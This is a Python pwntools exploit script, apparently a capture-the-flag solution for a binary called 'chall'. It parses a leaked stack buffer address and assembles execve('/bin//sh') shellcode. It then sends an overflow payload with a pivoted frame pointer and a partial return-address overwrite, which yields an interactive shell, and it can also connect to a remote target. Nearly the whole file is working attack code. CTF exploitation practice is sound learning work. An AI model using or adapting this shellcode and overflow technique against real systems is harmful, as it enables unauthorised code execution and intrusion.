#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *vuln+81
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

# leave --> mov rsp, rbp; pop rbp

def solve():
    io.recvuntil("Nickname @>")
    buf = int(io.recvline().strip(), 16)
    info("buf leak: %#x", buf)

    offset = 256

    sc = asm("""
        movabs rax, 0x68732f2f6e69622f
        lea rdi, [rsi+0x50]
        mov qword ptr [rdi], rax
        xor rax, rax
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 0x3b
        syscall     
    """)

    print(len(sc))

    payload =  b'A'*0x10 + p64(buf+0x18) + sc + asm("nop")*(offset-0x3b) + p16((buf & 0xffff) + 8)

    print(len(payload))

    io.sendline(payload)


    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()
